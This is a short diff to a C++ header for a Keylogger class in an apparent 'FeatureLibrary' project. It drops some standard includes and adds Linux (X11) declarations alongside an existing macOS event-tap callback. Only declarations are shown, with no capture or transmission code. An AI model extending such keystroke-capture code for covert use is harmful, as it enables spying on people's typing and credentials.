@@ -1,9 +1,5 @@
 #pragma once
 #include "FeatureLibrary.h"
-#include <mutex>
-#include <string>
-#include <thread>
-#include <atomic>
 
 #ifdef __APPLE__
 #endif
@@ -36,6 +32,11 @@ private:
         
         static CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
         void MacLoop(); 
+    #endif
+
+    #ifdef __linux__
+        int x11Display = 0;
+        void LinuxLoop();
     #endif
 public:
     Keylogger();
